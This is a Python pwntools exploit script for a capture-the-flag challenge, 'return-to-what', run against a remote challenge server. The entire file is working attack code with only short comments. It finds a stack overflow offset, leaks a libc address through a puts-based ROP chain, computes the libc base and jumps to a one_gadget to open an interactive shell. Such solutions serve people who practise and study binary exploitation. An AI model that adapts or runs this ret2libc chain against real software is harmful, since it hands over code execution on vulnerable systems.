# https://libc.blukat.me
from pwn import *


def get_offset():
    io = process('./return-to-what')
    io.recv()
    io.sendline(cyclic(100, n=8))
    io.wait()
    core = Core('./core')
    offset = cyclic_find(core.fault_addr, n=8)
    print('Offset: ' + str(offset))
    return offset


def leak_libc(io, offset):
    r = ROP(e)
    puts = e.plt['puts']
    pop_rdi = (r.find_gadget(['pop rdi', 'ret']))[0]
    main = e.symbols['main']

    # !!! Uncomment these lines 1 by 1 to leak enough addresses !!!
    puts_got = e.got['puts']
    # libc_start_main = e.symbols['__libc_start_main']
    # gets = e.got['gets']

    p = offset * b'A' + p64(pop_rdi) + p64(puts_got) + p64(puts) + p64(main)
    # p = offset * b'A' + p64(pop_rdi) + p64(libc_start_main) + p64(puts) + p64(main)
    # p = offset * b'A' + p64(pop_rdi) + p64(gets) + p64(puts) + p64(main)

    print(io.recv())
    io.sendline(p)
    data = io.recvline().strip().ljust(8, b'\x00')
    leak = u64(data)
    print('leaked address: ' + hex(leak))

    # !!! Leave puts_got uncommented !!!
    libc_base = leak - libc.symbols['puts']
    print('libc_base: ' + hex(libc_base))
    return libc_base


io = remote('chal.duc.tf', 30003)

e = ELF('./return-to-what')
# !!! This is added after leaking !!!
libc = ELF('libc6_2.27-3ubuntu1_amd64.so')

offset = get_offset()
libc_base = leak_libc(io, offset)

# !!! Used the second output from one_gadget !!!
p = offset * b'A' + p64(libc_base + 0x4f322)
print(io.recv())
io.sendline(p)
io.interactive()
